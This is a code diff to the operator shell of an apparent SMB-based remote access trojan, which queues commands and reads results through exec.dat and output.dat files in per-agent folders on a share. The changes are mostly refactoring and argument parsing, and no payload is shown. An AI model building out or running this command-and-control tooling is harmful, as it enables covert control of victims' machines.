@@ -1,15 +1,28 @@
 import argparse
 import cmd
 import os
+import pprint
 
 from watchdog.events import FileSystemEventHandler, DirCreatedEvent
 from watchdog.observers import Observer
+
+from colorama import Fore, Back, Style
 
 EXEC_DAT = 'exec.dat'
 OUTPUT_DAT = 'output.dat'
 Share = None
 
 Sessions = dict(default = dict())
+
+
+class CLIArgumentParser( argparse.ArgumentParser ) :
+	def exit(self, ex_code = 1, message = "Unrecognised") :
+		# print message
+		# print '[!] [EXIT] - ', ex_code, message
+		return
+
+	# def error(self, message) : print (message)
+
 
 def get_exec_path(project, agent):
 	return Share + os.sep + project + os.sep + agent + os.sep + EXEC_DAT
@@ -36,18 +49,16 @@ def initialize(share_folder) :
 	global Share
 	Share = share_folder
 
-	projects = os.listdir(Share)
-
-	for project in projects:
-		Sessions[project] = {}
-		project_dir = Share + os.sep + project
-		agents = os.listdir(project_dir)
-
-		for agent in agents:
-			agent_dir = project_dir + os.sep + agent + os.sep
-			Sessions[project][agent] = {}
-			Sessions[project][agent]['exec'] = os.path.isfile(agent_dir + EXEC_DAT)
-			Sessions[project][agent]['output'] = os.path.isfile(agent_dir + OUTPUT_DAT)
+	for root, projects, files in os.walk(share_folder):
+		for project in projects:
+			Sessions[project] = {}
+			project_dir = Share + os.sep + project
+			for subroot, agents, subfiles in os.walk(project_dir):
+				for agent in agents:
+					agent_dir = project_dir + os.sep + agent + os.sep
+					Sessions[project][agent] = {}
+					Sessions[project][agent]['exec'] = os.path.isfile(agent_dir + EXEC_DAT)
+					Sessions[project][agent]['output'] = os.path.isfile(agent_dir + OUTPUT_DAT)
 
 
 class SessionHandler(FileSystemEventHandler) :
@@ -73,7 +84,8 @@ class SessionHandler(FileSystemEventHandler) :
 
 	def on_deleted(self, event):
 		if event.src_path.endswith(EXEC_DAT):
-			project, agent = event.src_path.split(os.sep)[1:-1]
+			# event.src_path: <Share>/<ProjectName>/<Agent-MAC>/<file_deleted>
+			project, agent = event.src_path.split(os.sep)[-3:-1]
 			output_dat = get_output_path(project, agent)
 			with open(output_dat, 'r') as output_file:
 
@@ -98,7 +110,7 @@ class SMBRatShell(cmd.Cmd) :
 	def emptyline(self, *args): return ''
 
 	def do_session(self, line):
-		print(self.session_dict)
+		pprint.pprint(self.session_dict)
 		pass
 
 	def do_selected(self, line):
@@ -108,6 +120,13 @@ class SMBRatShell(cmd.Cmd) :
 Shows the list of Selected Agents
 
 		"""
+		arg_parser = CLIArgumentParser()
+		arg_parser.add_argument('--add', '-a', help = 'Add an Agent to the "selected" list', nargs = '+')
+		arg_parser.add_argument('--remove', '-r', help = 'Remove an Agent from the "selected" list', nargs = '+')
+		# arg_parser.add_argument('--list', '-l', help = 'List all available agents', action = store_true)
+		args = arg_parser.parse_args(line.split())
+		if args.add:
+			print(args.add)
 		if not self.selected:
 			print ("No agents selected!")
 			return ""
